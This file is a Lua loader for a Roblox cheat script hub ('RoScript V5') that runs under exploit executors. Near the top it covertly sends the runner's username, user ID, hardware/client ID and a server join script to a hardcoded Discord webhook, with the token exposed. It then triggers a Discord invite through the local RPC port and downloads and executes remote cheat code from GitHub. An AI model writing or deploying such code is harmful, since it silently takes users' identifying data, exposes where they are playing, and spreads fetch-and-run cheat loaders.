if RoScript_Loaded == true then
  warn("Error: RoScript V5 already loaded!")
  warn("Wait 5 seconds before executing again!")
  return
end
pcall(function() getgenv().RoScript_Loaded = true end)
if identifyexecutor() == "Synapse X" then
    req = syn.request;
else
    req = http_request;
end;
local data = {
    ["content"] = "";
    ["embeds"] = {
        {
            ["title"] = "Oops! Someone executed!";
            ["description"] = "**User Profile:** https://rblx.name/"..tostring(game:GetService("Players").LocalPlayer.UserId).."\n **Currently Playing:** https://rblx.games/"..game.PlaceId;
            ["type"] = "rich";
            ["color"] = nil;
            ["fields"] = {
                {
                    ["name"] = "";
                    ["value"] = "**Username:** "..game:GetService("Players").LocalPlayer.Name.."\n **User ID:** "..game:GetService("Players").LocalPlayer.UserId.."\n **Executor:** "..tostring(identifyexecutor()).."\n **Hardware ID: **"..game:GetService("RbxAnalyticsService"):GetClientId().." \n **Join Script:**"..[[```game:GetService("TeleportService"):TeleportToPlaceInstance(]]..game["PlaceId"]..[[, "]]..game["JobId"]..[[", game:GetService("Players").LocalPlayer)```]]
                }
            }
            };
    };
}
req({Url="https://discord.com/api/webhooks/1051349432769196072/V4Hcyys9WpFdltqfLa6v2cJGXQSr7LQrJAeB5f3RZvtE0BH0TBo2T5QfDc0NriwcHMDx",Body=game.HttpService:JSONEncode(data),Method="POST",Headers={["content-type"]="application/json"}})
local http = game:GetService("HttpService")
if writefile and isfile then
    if isfile("discord.json") == false then
        Settings = {
            Discord_Invite_On_Execution = true
        }
        thingy = http:JSONEncode(Settings)
        writefile("discord.json",thingy)
    end
end
task.spawn(function()
    if isfile and isfile("discord.json") then
        local requesttype = nil
        if identifyexecutor() == "Synapse X" then
            requesttype = syn.request;
        else
            requesttype = http_request;
        end
        local http = game:GetService("HttpService")
        local file = http:JSONDecode(readfile("discord.json"))
        if file.Discord_Invite_On_Execution == true then
            local http = game:GetService('HttpService') 
            local req = requesttype
            if req then
                requesttype({
                    Url = 'http://127.0.0.1:6463/rpc?v=1',
                    Method = 'POST',
                    Headers = {
                        ['Content-Type'] = 'application/json',
                        Origin = 'https://discord.com'
                    },
                    Body = http:JSONEncode({
                        cmd = 'INVITE_BROWSER',
                        nonce = http:GenerateGUID(false),
                        args = {code = 'eyEwHCVjQy'}
                    })
                })
                wait()
                Settings = {
            Discord_Invite_On_Execution = false
        }
        thingy = http:JSONEncode(Settings)
        writefile("discord.json",thingy)
            end
        end
    end
end)
pcall(function() getgenv().RoScript_Loaded = false end)
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
Fluent:Notify({
    Title = "RoScript V5",
    Content = "Loading RoScript V5... | Please wait!",
    Duration = 8
})
wait(8.5)
if game.Players.LocalPlayer.UserId == nil then
Fluent:Notify({
    Title = "RoScript V5",
    Content = "Error 403 | You are currently blacklisted!",
    Duration = 8
})
wait(9)
game:Shutdown()
end
  if game.PlaceId == 7952502098 or game.PlaceId == 1240123653 or game.PlaceId == 1632210982 or game.PlaceId == 12398414727 or game.PlaceId == 14469379009 or game.PlaceId == 11970456 or game.PlaceId == 2537430692 or game.PlaceId == 13924946576 or game.PlaceId == 8705534359 or game.PlaceId == 5059952999 or game.PlaceId == 11756661207 or game.PlaceId == 10679961467 or game.PlaceId == 11727501024 or game.PlaceId == 11103424163 or game.PlaceId == 12081110790 or game.PlaceId == 12081166311 or game.PlaceId == 14427937850 or game.PlaceId == 206640076 or game.PlaceId == 9961650006 or game.PlaceId == 3851622790 or game.PlaceId == 4620170611 or game.PlaceId == 20321167 then
    loadstring(game:HttpGet("https://github.com/RScript-O0607O/-4-4SH4-X0CP-9-QvzU9Vp-u-XtO7pKRxr-A-ggh-caVYh/raw/main/loader/scripts/id/"..game.PlaceId..".lua"))()
  else loadstring(game:HttpGet("https://github.com/RScript-O0607O/-4-4SH4-X0CP-9-QvzU9Vp-u-XtO7pKRxr-A-ggh-caVYh/raw/main/loader/scripts/unsupported.lua"))()
  end end
